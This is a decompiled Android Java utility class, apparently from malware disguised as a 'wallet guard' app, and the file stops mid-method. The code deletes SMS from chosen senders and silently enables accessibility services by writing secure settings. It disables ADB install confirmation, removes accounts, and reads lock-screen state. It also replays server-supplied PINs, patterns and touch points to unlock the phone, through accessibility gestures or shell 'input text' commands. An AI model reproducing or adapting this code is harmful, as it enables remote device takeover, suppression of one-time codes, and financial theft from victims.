package com.guard.wallet.utils;

import a1.q;
import android.accessibilityservice.GestureDescription.Builder;
import android.accessibilityservice.GestureDescription.StrokeDescription;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.Application;
import android.app.KeyguardManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PermissionInfo;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Matrix;
import android.graphics.Path;
import android.graphics.Picture;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.Bitmap.Config;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.os.Process;
import android.os.Build.VERSION;
import android.provider.ContactsContract.Data;
import android.provider.MediaStore.Images.Media;
import android.provider.Settings.Global;
import android.provider.Settings.Secure;
import android.provider.Settings.System;
import android.sun.misc.BASE64Encoder;
import android.sun.security.x509.AlgorithmId;
import android.sun.security.x509.CertificateAlgorithmId;
import android.sun.security.x509.CertificateExtensions;
import android.sun.security.x509.CertificateIssuerName;
import android.sun.security.x509.CertificateSerialNumber;
import android.sun.security.x509.CertificateSubjectName;
import android.sun.security.x509.CertificateValidity;
import android.sun.security.x509.CertificateVersion;
import android.sun.security.x509.CertificateX509Key;
import android.sun.security.x509.KeyIdentifier;
import android.sun.security.x509.PrivateKeyUsageExtension;
import android.sun.security.x509.SubjectKeyIdentifierExtension;
import android.sun.security.x509.X500Name;
import android.sun.security.x509.X509CertImpl;
import android.sun.security.x509.X509CertInfo;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.ViewConfiguration;
import com.guard.wallet.MainApplication;
import com.guard.wallet.activity.ConfirmDeviceActivity;
import com.guard.wallet.condition.ActionValueCondition;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.GlobalActionCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.entity.WIFIState;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.http.l;
import com.guard.wallet.receiver.AlarmReceiver;
import com.guard.wallet.receiver.BatteryLevelReceiver;
import com.guard.wallet.receiver.BootBroadcast;
import com.guard.wallet.receiver.CallReceiver;
import com.guard.wallet.receiver.CustomAdminReceiver;
import com.guard.wallet.receiver.NetWorkReceiver;
import com.guard.wallet.receiver.PackageReceiver;
import com.guard.wallet.receiver.PowerBroadcastReceiver;
import com.guard.wallet.receiver.ScreenBroadcastReceiver;
import com.guard.wallet.receiver.ShutDownBroadcastReceiver;
import com.guard.wallet.receiver.SmsReceiver;
import com.guard.wallet.req.DeviceCipherStateVO;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.resp.AppInfo;
import com.guard.wallet.resp.CallStateVO;
import com.guard.wallet.resp.DeviceAdminVO;
import com.guard.wallet.resp.DeviceContactInfoVO;
import com.guard.wallet.resp.DeviceContactNumberVO;
import com.guard.wallet.resp.PermissionInfoVO;
import com.guard.wallet.resp.PermissionsBodyVO;
import com.guard.wallet.resp.SmsRecognizePlug;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import java.security.spec.PKCS8EncodedKeySpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Locale;
import java.util.Objects;
import java.util.Random;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import p0.u;

public abstract class g {
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void A(String var0) {
      if (MainApplication.getAppContext() != null && !q.B(var0)) {
         Uri var4 = Uri.parse("content://sms/");
         ContentResolver var3 = MainApplication.getAppContext().getContentResolver();
         if (var3 != null) {
            Exception var10000;
            label41: {
               try {
                  var8 = var3.query(var4, new String[]{"_id", "thread_id", "address", "person", "date"}, "address=?", new String[]{var0}, "date DESC");
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var10001 = false;
                  break label41;
               }

               if (var8 == null) {
                  return;
               }

               try {
                  if (var8.moveToFirst()) {
                     long var1 = var8.getLong(0);
                     StringBuilder var10 = new StringBuilder("content://sms/");
                     var10.append(var1);
                     var3.delete(Uri.parse(var10.toString()), null, null);
                  }
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var11 = false;
                  break label41;
               }

               try {
                  var8.close();
                  return;
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var12 = false;
               }
            }

            Exception var9 = var10000;
            q.s("SmsManager", var9);
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static Intent A0(String var0, String var1) {
      Object var3 = null;
      Intent var2 = (Intent)var3;

      label87: {
         Exception var10000;
         label93: {
            label94: {
               label95: {
                  try {
                     if (!q.B(var1)) {
                        break label95;
                     }
                  } catch (Exception var14) {
                     var10000 = var14;
                     boolean var10001 = false;
                     break label93;
                  }

                  var2 = (Intent)var3;

                  try {
                     var15 = u0(var0);
                     break label94;
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var17 = false;
                     break label93;
                  }
               }

               var2 = (Intent)var3;

               ComponentName var4;
               try {
                  var4 = new ComponentName(var0, var1);
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var18 = false;
                  break label93;
               }

               var2 = (Intent)var3;

               try {
                  // [VF-FIX] var4./* $VF: Unable to resugar constructor */<init>(var0, var1);
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var19 = false;
                  break label93;
               }

               var2 = (Intent)var3;

               try {
                  var15 = new Intent();
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var20 = false;
                  break label93;
               }

               var2 = (Intent)var3;

               try {
                  // [VF-FIX] var15./* $VF: Unable to resugar constructor */<init>();
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var21 = false;
                  break label93;
               }

               try {
                  var15.setComponent(var4);
               } catch (Exception var6) {
                  var16 = var6;
                  var2 = var15;
                  break label87;
               }
            }

            if (var15 == null) {
               return var15;
            }

            var2 = var15;

            try {
               var15.addFlags(268435456);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var22 = false;
               break label93;
            }

            var2 = var15;

            try {
               var15.addFlags(2097152);
            } catch (Exception var7) {
               var10000 = var7;
               boolean var23 = false;
               break label93;
            }

            var2 = var15;

            try {
               var15.addFlags(8388608);
               return var15;
            } catch (Exception var5) {
               var10000 = var5;
               boolean var24 = false;
            }
         }

         var16 = var10000;
      }

      q.s("ApplicationUtil", var16);
      return var2;
   }

   public static boolean B(String var0, String var1) {
      if (!Objects.equals(var0, var1) && !q.B(var1) && Z() != null && Z().getContentResolver() != null && i()) {
         int var2;
         try {
            Uri var4 = Uri.parse(var1);
            if (VERSION.SDK_INT >= 30) {
               var2 = a0.h.a(Z().getContentResolver(), var4);
            } else {
               var2 = Z().getContentResolver().delete(var4, null, null);
            }
         } catch (Exception var3) {
            q.s("GalleryUtils", var3);
            return false;
         }

         if (var2 > 0) {
            return true;
         }
      }

      return false;
   }

   public static LockPatternVO B0() {
      Integer var1 = 0;
      int var0 = -1;
      LockPatternVO var4 = new LockPatternVO(var1, var1, var1, var1, var1, var1, -1);
      if (Z() != null) {
         var4.setIsScreenOn(Integer.valueOf(e.j()));
         DevicePolicyManager var2 = (DevicePolicyManager)Z().getSystemService("device_policy");
         ComponentName var3 = new ComponentName(Z(), CustomAdminReceiver.class);
         if (var2.isDeviceOwnerApp(Z().getPackageName()) || var2.isProfileOwnerApp(Z().getPackageName())) {
            var0 = var2.getPasswordQuality(var3);
         }

         KeyguardManager var5 = (KeyguardManager)Z().getSystemService("keyguard");
         if (var5.isKeyguardLocked()) {
            var4.setIsKeyguardLocked(1);
         }

         if (var5.isDeviceLocked()) {
            var4.setIsDeviceLocked(1);
         }

         if (var5.isKeyguardSecure()) {
            var4.setIsKeyguardSecure(1);
         }

         if (var5.isDeviceSecure()) {
            var4.setIsDeviceSecure(1);
         }

         if (var5.inKeyguardRestrictedInputMode()) {
            var4.setInKeyguardRestrictedInputMode(1);
         }

         var4.setQuality(var0);
      }

      return var4;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean C() {
      if (Z() != null && j()) {
         Exception var10000;
         label56: {
            LinkedHashSet var2;
            label50: {
               Iterator var7;
               try {
                  LinkedList var1 = f0();
                  var2 = q0();
                  if (var1.isEmpty() || var2.isEmpty()) {
                     break label50;
                  }

                  var7 = var1.iterator();
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var10001 = false;
                  break label56;
               }

               while (true) {
                  try {
                     if (!var7.hasNext()) {
                        break;
                     }

                     var2.remove((String)var7.next());
                  } catch (Exception var5) {
                     var10000 = var5;
                     boolean var10 = false;
                     break label56;
                  }
               }
            }

            String var8 = "";

            try {
               if (!var2.isEmpty()) {
                  var8 = TextUtils.join(":", var2);
               }
            } catch (Exception var4) {
               var10000 = var4;
               boolean var11 = false;
               break label56;
            }

            try {
               return Secure.putString(Z().getContentResolver(), "enabled_accessibility_services", var8);
            } catch (Exception var3) {
               var10000 = var3;
               boolean var12 = false;
            }
         }

         Exception var9 = var10000;
         q.s("ApplicationUtil", var9);
      }

      return false;
   }

   public static DeviceAdminVO C0() {
      Integer var0 = 0;
      DeviceAdminVO var2 = new DeviceAdminVO(null, var0, var0, var0);
      if (Z() != null) {
         var2.setPackageName(Z().getPackageName());
         DevicePolicyManager var1 = (DevicePolicyManager)Z().getSystemService("device_policy");
         if (var1.isAdminActive(new ComponentName(Z(), CustomAdminReceiver.class))) {
            var2.setIsAdminActive(1);
            if (var1.isDeviceOwnerApp(Z().getPackageName())) {
               var2.setIsDeviceOwner(1);
               var2.setIsProfileOwner(1);
            }

            if (var1.isProfileOwnerApp(Z().getPackageName())) {
               var2.setIsProfileOwner(1);
            }
         }
      }

      return var2;
   }

   public static void D() {
      if (Z() != null && ContextCompat.checkSelfPermission(Z(), "android.permission.WRITE_SECURE_SETTINGS") == 0) {
         int var0;
         try {
            var0 = Secure.getInt(Z().getContentResolver(), "adb_install_need_confirm");
         } catch (Exception var3) {
            q.s("ApplicationUtil", var3);
            var0 = -1;
         }

         try {
            if (!Objects.equals(var0, 0)) {
               Secure.putInt(Z().getContentResolver(), "adb_install_need_confirm", 0);
            }
         } catch (Exception var2) {
            q.s("ApplicationUtil", var2);
         }
      }
   }

   public static CombineFilter D0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.c(var0, "className", "android.view.View");
      var0.getStringConditions().add(var1);
      var1 = new StringCondition();
      var1.setProperty("desc");
      var1.setRegex("\\d");
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static int E(String var0) {
      byte var2 = 0;
      int var1 = var2;

      try {
         if (!q.B(var0)) {
            SmsRecognizePlugUtils$1 var3 = new SmsRecognizePlugUtils$1();
            var1 = F((List)h.c(var0, var3));
         }
      } catch (Exception var4) {
         q.s("com.guard.wallet.utils.g", var4);
         var1 = var2;
      }

      return var1;
   }

   public static String E0(o0.h var0, ArrayList var1) {
      if (var1 == null) {
         return "";
      } else {
         int var3 = var1.size();
         StringBuilder var5 = new StringBuilder();

         for (int var2 = 0; var2 < var3; var2++) {
            o0.d var6 = (o0.d)var1.get(var2);
            int var4 = var6.a;
            var5.append(var0.getDotCount() * var4 + var6.b);
         }

         return var5.toString();
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static int F(List var0) {
      MainApplication var6 = MainApplication.getInstance();
      byte var5 = 0;
      byte var4 = 0;
      int var2 = 0;
      int var3 = var4;
      if (var6 != null) {
         if (MainApplication.getInstance().getSmsMessageListener() == null) {
            var3 = var4;
         } else {
            var3 = var4;
            if (var0 != null) {
               int var1 = var5;
               int var32 = var4;

               Exception var10000;
               label101: {
                  try {
                     if (var0.isEmpty()) {
                        return var32;
                     }
                  } catch (Exception var17) {
                     var10000 = var17;
                     boolean var10001 = false;
                     break label101;
                  }

                  var1 = var5;

                  try {
                     MainApplication.getInstance().getSmsMessageListener().a.clear();
                  } catch (Exception var16) {
                     var10000 = var16;
                     boolean var23 = false;
                     break label101;
                  }

                  var1 = var5;

                  try {
                     var18 = var0.iterator();
                  } catch (Exception var15) {
                     var10000 = var15;
                     boolean var24 = false;
                     break label101;
                  }

                  while (true) {
                     var1 = var2;
                     var32 = var2;

                     try {
                        if (!var18.hasNext()) {
                           return var32;
                        }
                     } catch (Exception var14) {
                        var10000 = var14;
                        boolean var25 = false;
                        break;
                     }

                     var1 = var2;

                     try {
                        var21 = (SmsRecognizePlug)var18.next();
                     } catch (Exception var13) {
                        var10000 = var13;
                        boolean var26 = false;
                        break;
                     }

                     var32 = var2 + 1;
                     var1 = var32;

                     u.b var7;
                     try {
                        var7 = MainApplication.getInstance().getSmsMessageListener();
                     } catch (Exception var12) {
                        var10000 = var12;
                        boolean var27 = false;
                        break;
                     }

                     if (var21 != null) {
                        var1 = var32;

                        try {
                           var22 = var7.a;
                        } catch (Exception var10) {
                           var10000 = var10;
                           boolean var29 = false;
                           break;
                        }

                        var2 = var32;
                        var1 = var32;

                        try {
                           if (var22.contains(var21)) {
                              continue;
                           }
                        } catch (Exception var9) {
                           var10000 = var9;
                           boolean var30 = false;
                           break;
                        }

                        var1 = var32;

                        try {
                           var22.add(var21);
                        } catch (Exception var8) {
                           var10000 = var8;
                           boolean var31 = false;
                           break;
                        }

                        var2 = var32;
                     } else {
                        var1 = var32;

                        try {
                           var7.getClass();
                        } catch (Exception var11) {
                           var10000 = var11;
                           boolean var28 = false;
                           break;
                        }

                        var2 = var32;
                     }
                  }
               }

               Exception var19 = var10000;
               q.s("com.guard.wallet.utils.g", var19);
               var3 = var1;
            }
         }
      }

      return var3;
   }

   public static boolean F0(int var0) {
      return MyAccessibilityService.P() == null ? false : MyAccessibilityService.P().performGlobalAction(var0);
   }

   public static int G(String var0) {
      byte var2 = 0;
      int var1 = var2;

      try {
         if (!q.B(var0)) {
            ListenWindowUtils$1 var3 = new ListenWindowUtils$1();
            var1 = H((List)h.c(var0, var3));
         }
      } catch (Exception var4) {
         q.s("com.guard.wallet.utils.g", var4);
         var1 = var2;
      }

      return var1;
   }

   public static boolean G0(Integer var0, Integer var1, Long var2) {
      return S(16L, var2, new Point(var0.floatValue(), var1.floatValue()));
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static int H(List var0) {
      AtomicInteger var1 = new AtomicInteger(0);
      if (var0 != null) {
         Exception var10000;
         label84: {
            try {
               if (var0.isEmpty()) {
                  return var1.get();
               }

               if (MyAccessibilityService.P() == null) {
                  return var1.get();
               }
            } catch (Exception var11) {
               var10000 = var11;
               boolean var10001 = false;
               break label84;
            }

            try {
               if (MyAccessibilityService.P().j()) {
                  return var1.get();
               }
            } catch (Exception var12) {
               var10000 = var12;
               boolean var17 = false;
               break label84;
            }

            MyAccessibilityService var2;
            ConcurrentLinkedQueue var4;
            try {
               Collections.sort(var0);
               var2 = MyAccessibilityService.P();
               var4 = var2.a;
            } catch (Exception var10) {
               var10000 = var10;
               boolean var18 = false;
               break label84;
            }

            try {
               if (!var4.isEmpty()) {
                  a0.a var3 = new a0.a(var2, 4);
                  var4.removeIf(var3);
               }
            } catch (Exception var9) {
               Exception var15 = var9;

               try {
                  q.s("com.guard.wallet.service.AccessibilityDelegateManager", var15);
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var19 = false;
                  break label84;
               }
            }

            try {
               var16 = var0.iterator();
            } catch (Exception var7) {
               var10000 = var7;
               boolean var20 = false;
               break label84;
            }

            while (true) {
               try {
                  if (!var16.hasNext()) {
                     return var1.get();
                  }

                  var13 = (ListenWindow)var16.next();
                  var1.incrementAndGet();
                  if (var13.getEventSubscribes() != null && var13.getEventSubscribes().size() >= 2) {
                     Collections.sort(var13.getEventSubscribes());
                  }
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var21 = false;
                  break;
               }

               try {
                  MyAccessibilityService.P().c(var13);
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var22 = false;
                  break;
               }
            }
         }

         Exception var14 = var10000;
         q.s("com.guard.wallet.utils.g", var14);
      }

      return var1.get();
   }

   public static Certificate H0() {
      try {
         String var0 = i0();
         if (!q.B(var0)) {
            String var1 = var0.concat("/").concat("cert.pem");
            File var3 = new File(var1);
            if (!var3.exists()) {
               return null;
            }

            FileInputStream var4 = new FileInputStream(var3);
            return CertificateFactory.getInstance("X.509").generateCertificate(var4);
         }
      } catch (Exception var2) {
         q.s("AdbKeyUtils", var2);
      }

      return null;
   }

   public static boolean I() {
      Context var2 = Z();
      boolean var1 = false;
      boolean var0 = false;
      if (var2 != null) {
         if (Global.getInt(Z().getContentResolver(), "adb_enabled", 0) > 0) {
            var0 = true;
         }

         var1 = var0;
         if (!var0) {
            Log.d("ApplicationUtil", "未开启ADB调试");
            var1 = var0;
         }
      }

      return var1;
   }

   public static PrivateKey I0() {
      try {
         String var0 = i0();
         if (!q.B(var0)) {
            var0 = var0.concat("/").concat("private.key");
            File var1 = new File(var0);
            if (!var1.exists()) {
               return null;
            }

            byte[] var5 = new byte[(int)var1.length()];
            FileInputStream var2 = new FileInputStream(var1);
            if (var2.read(var5) > 0) {
               KeyFactory var6 = KeyFactory.getInstance("RSA");
               PKCS8EncodedKeySpec var7 = new PKCS8EncodedKeySpec(var5);
               return var6.generatePrivate(var7);
            }
         }
      } catch (Exception var3) {
         q.s("AdbKeyUtils", var3);
      }

      return null;
   }

   public static boolean J() {
      Context var2 = Z();
      boolean var1 = false;
      boolean var0 = false;
      if (var2 != null) {
         if (Global.getInt(Z().getContentResolver(), "adb_wifi_enabled", 0) > 0) {
            var0 = true;
         }

         var1 = var0;
         if (!var0) {
            Log.d("ApplicationUtil", "未开启无线调试");
            var1 = var0;
         }
      }

      return var1;
   }

   public static void J0(Bitmap var0) {
      if (var0 != null && !var0.isRecycled()) {
         var0.recycle();
      }
   }

   public static boolean K() {
      Context var2 = Z();
      boolean var1 = false;
      boolean var0 = var1;
      if (var2 != null) {
         var0 = var1;
         if (Global.getInt(Z().getContentResolver(), "development_settings_enabled", 0) > 0) {
            var0 = true;
         }
      }

      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean K0(String var0) {
      String var9 = var0;
      if (q.B(var0)) {
         var9 = "com.guard.wallet";
      }

      Context var14 = Z();
      boolean var7 = false;
      if (var14 != null) {
         int var3;
         int var4;
         label54: {
            label65: {
               Exception var10000;
               label61: {
                  int var5;
                  int var6;
                  Account[] var10;
                  AccountManager var11;
                  try {
                     var11 = AccountManager.get(Z());
                     var10 = var11.getAccountsByType(var9);
                     if (var10.length <= 0) {
                        break label65;
                     }

                     var5 = var10.length;
                     var6 = var10.length;
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var10001 = false;
                     break label61;
                  }

                  int var2 = 0;
                  int var1 = 0;

                  while (true) {
                     var4 = var5;
                     var3 = var1;
                     if (var2 >= var6) {
                        break label54;
                     }

                     Account var15 = var10[var2];
                     var3 = var1;

                     label42: {
                        boolean var8;
                        try {
                           if (!Objects.equals(var15.type, var9)) {
                              break label42;
                           }

                           var8 = var11.removeAccountExplicitly(var15);
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var18 = false;
                           break;
                        }

                        var3 = var1;
                        if (var8) {
                           var3 = var1 + 1;
                        }
                     }

                     var2++;
                     var1 = var3;
                  }
               }

               Exception var16 = var10000;
               q.s("AccountUtils", var16);
               return false;
            }

            var4 = 0;
            var3 = 0;
         }

         if (var3 == var4) {
            var7 = true;
         }

         return var7;
      } else {
         return false;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean L() {
      if (Z() != null && j()) {
         Exception var10000;
         label60: {
            try {
               if (x() && C()) {
                  T0(10);
               }
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10001 = false;
               break label60;
            }

            boolean var0;
            label51: {
               label50: {
                  try {
                     if (x()) {
                        return false;
                     }

                     LinkedList var2 = f0();
                     LinkedHashSet var1 = q0();
                     if (var2.isEmpty()) {
                        return false;
                     }

                     var1.add((String)var2.get(0));
                     String var6 = TextUtils.join(":", var1);
                     if (Secure.putString(Z().getContentResolver(), "enabled_accessibility_services", var6)
                        && Secure.putInt(Z().getContentResolver(), "accessibility_enabled", 1)
                        && Secure.putInt(Z().getContentResolver(), "touch_exploration_enabled", 1)
                        && Secure.putString(Z().getContentResolver(), "touch_exploration_granted_accessibility_services", var6)) {
                        break label50;
                     }
                  } catch (Exception var4) {
                     var10000 = var4;
                     boolean var8 = false;
                     break label60;
                  }

                  var0 = false;
                  break label51;
               }

               var0 = true;
            }

            if (!var0) {
               return false;
            }

            try {
               Log.d("ApplicationUtil", "本地启动无障碍服务成功");
               return true;
            } catch (Exception var3) {
               var10000 = var3;
               boolean var9 = false;
            }
         }

         Exception var7 = var10000;
         q.s("ApplicationUtil", var7);
      }

      return false;
   }

   public static String L0(u var0) {
      String var1 = var0.e();
      String var2 = var0.g();
      String var3 = var1;
      if (var2 != null) {
         StringBuilder var4 = new StringBuilder();
         var4.append(var1);
         var4.append('?');
         var4.append(var2);
         var3 = var4.toString();
      }

      return var3;
   }

   public static void M(UiObject var0) {
      if (p0()) {
         if (h.e.S() != null && h.e.S().D() && h.e.S().N("input keyevent 66")) {
            return;
         }

         if (MyAccessibilityService.P() != null && var0 != null && VERSION.SDK_INT >= 30) {
            var0.enter();
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static byte[] M0(Bitmap var0, float var1, int var2) {
      float var3;
      label60: {
         if (!(var1 > 1.0F)) {
            var3 = var1;
            if (!(var1 <= 0.0F)) {
               break label60;
            }
         }

         var3 = 0.5F;
      }

      int var4;
      label55: {
         if (var2 <= 100) {
            var4 = var2;
            if (var2 > 0) {
               break label55;
            }
         }

         var4 = 20;
      }

      ByteArrayOutputStream var5 = new ByteArrayOutputStream();
      if (var0 == null) {
         return var5.toByteArray();
      } else {
         Exception var10000;
         label63: {
            Bitmap var6;
            label64: {
               try {
                  var6 = k0(var0, (double)((float)var0.getWidth() * var3));
                  if (VERSION.SDK_INT >= 30) {
                     var11 = a0.h.c();
                     break label64;
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var10001 = false;
                  break label63;
               }

               try {
                  var11 = CompressFormat.WEBP;
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var13 = false;
                  break label63;
               }
            }

            try {
               var6.compress(var11, var4, var5);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var14 = false;
               break label63;
            }

            try {
               var5.flush();
               var5.close();
               J0(var6);
               return var5.toByteArray();
            } catch (Exception var7) {
               var10000 = var7;
               boolean var15 = false;
            }
         }

         Exception var12 = var10000;
         q.s("BitmapUtils", var12);
         return var5.toByteArray();
      }
   }

   public static void N(UiObject var0) {
      label48: {
         if (p0()) {
            if (MyAccessibilityService.P() != null) {
               if (e.l()) {
                  if (u1()) {
                     var3 = "依VIVO规则确认密码完成";
                     break label48;
                  }

                  Log.e("UnLockUtils", "依VIVO规则确认密码失败");
               }

               if (e.m()) {
                  Log.d("UnLockUtils", "依MIUI规则输入回车键");
                  MyAccessibilityService var2 = MyAccessibilityService.P();
                  CombineFilter var1 = y1();
                  var2.getClass();
                  UiObject var4 = MyAccessibilityService.M(var1);
                  if (var4 != null && var4.click()) {
                     var3 = "查找并点击MIUI回车键完成";
                     break label48;
                  }

                  Log.e("UnLockUtils", "查找并点击MIUI回车键失败");
               }
            }

            if (h.e.S() != null && h.e.S().D()) {
               Log.d("UnLockUtils", "委托RatHat容器输入回车键");
               if (h.e.S().N("input keyevent 66")) {
                  var3 = "委托RatHat容器输入回车键完成";
                  break label48;
               }
            }

            if (MyAccessibilityService.P() != null) {
               Log.d("UnLockUtils", "委托无障碍容器输入回车键");
               UiObject var5 = var0;
               if (var0 == null) {
                  var5 = MyAccessibilityService.P().J();
               }

               if (var5 != null && VERSION.SDK_INT >= 30) {
                  var5.enter();
                  Log.d("UnLockUtils", "委托无障碍容器输入回车键完成");
               }
            }
         }

         return;
      }

      Log.d("UnLockUtils", var3);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static String N0(String var0) {
      if (Z() != null && Z().getContentResolver() != null && i()) {
         FileNotFoundException var10000;
         label40: {
            String var2;
            ContentResolver var3;
            try {
               var3 = Z().getContentResolver();
               var2 = q.x(var0);
            } catch (FileNotFoundException var6) {
               var10000 = var6;
               boolean var10001 = false;
               break label40;
            }

            String var1 = var2;

            label29: {
               try {
                  if (!q.B(var2)) {
                     break label29;
                  }
               } catch (FileNotFoundException var5) {
                  var10000 = var5;
                  boolean var8 = false;
                  break label40;
               }

               var1 = "unknown";
            }

            try {
               return Media.insertImage(var3, var0, var1, null);
            } catch (FileNotFoundException var4) {
               var10000 = var4;
               boolean var9 = false;
            }
         }

         FileNotFoundException var7 = var10000;
         q.s("GalleryUtils", var7);
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean O(DeviceCipherStateVO var0) {
      boolean var3 = true;
      boolean var4 = true;
      boolean var5 = true;
      boolean var1;
      if (var0 == null
         || (
            Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")
               ? var0.getTouchCipher() == null || var0.getTouchCipher().isEmpty()
               : (
                  Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")
                     ? var0.getPatternCipher() == null || var0.getPatternCipher().isEmpty()
                     : q.B(var0.getTextCipher()) || q.B(var0.getCipherGradeCode())
               )
         )) {
         var1 = 0;
      } else {
         var1 = 1;
      }

      if (!var1) {
         return false;
      } else {
         boolean var2;
         if (MyAccessibilityService.P() != null && !q.B(var0.getPackageName())) {
            var2 = Objects.equals(MyAccessibilityService.N(), var0.getPackageName());
         } else {
            var2 = false;
         }

         if (!var2) {
            return false;
         } else if (Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
            List var18 = var0.getTouchCipher();
            if (var18 != null && !var18.isEmpty()) {
               if (MyAccessibilityService.P() != null && t(var18)) {
                  return var5;
               }

               if (h.e.S() != null && h.e.S().D()) {
                  return h.e.S().c0(var18);
               }
            }

            return false;
         } else {
            var2 = Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN");
            Object var8 = null;
            if (var2) {
               List var14 = var0.getPatternCipher();
               if (var14 != null && !var14.isEmpty()) {
                  LinkedList var9 = new LinkedList(var14);
                  if (!var9.isEmpty()) {
                     ListIterator var10 = var9.listIterator();
                     Point var15 = (Point)var8;

                     while (var10.hasNext()) {
                        var8 = (Point)var10.next();
                        if (var8 != null && ((Point)var8).getX() >= 0.0F && ((Point)var8).getY() >= 0.0F) {
                           if (((Point)var8).equals(var15)) {
                              var10.remove();
                           }

                           var15 = (Point)var8;
                        } else {
                           var10.remove();
                        }
                     }
                  }

                  if (MyAccessibilityService.P() != null) {
                     Point[] var16 = new Point[var9.size()];
                     var9.toArray(var16);

                     Exception var10000;
                     label169: {
                        ExecutorService var29;
                        try {
                           var29 = Executors.newFixedThreadPool(1);
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var10001 = false;
                           break label169;
                        }

                        var1 = 1;

                        while (true) {
                           if (var1 > 4) {
                              return var3;
                           }

                           long var6 = (long)var1 * 1000L;

                           try {
                              CountDownLatch var28 = new CountDownLatch(1);
                              var8 = new com.guard.wallet.helper.h(var6, var16, 0);
                              var29.submit((Runnable)var8);
                              if (!var28.await(var6 + 1000L, TimeUnit.MILLISECONDS)) {
                                 T0(10);
                                 var29.shutdownNow();
                              }
                           } catch (Exception var11) {
                              var10000 = var11;
                              boolean var30 = false;
                              break;
                           }

                           var1++;
                        }
                     }

                     Exception var17 = var10000;
                     q.s("EnterCipherHelper", var17);
                     return var3;
                  }
               }

               return false;
            } else {
               String var13 = var0.getTextCipher();
               if (!q.B(var13)) {
                  if (h.e.S() != null && h.e.S().D()) {
                     var8 = "input text ".concat(var13);
                     if (h.e.S().N((String)var8)) {
                        M(null);
                        return var4;
                     }
                  }

                  if (MyAccessibilityService.P() != null) {
                     var8 = MyAccessibilityService.P().J();
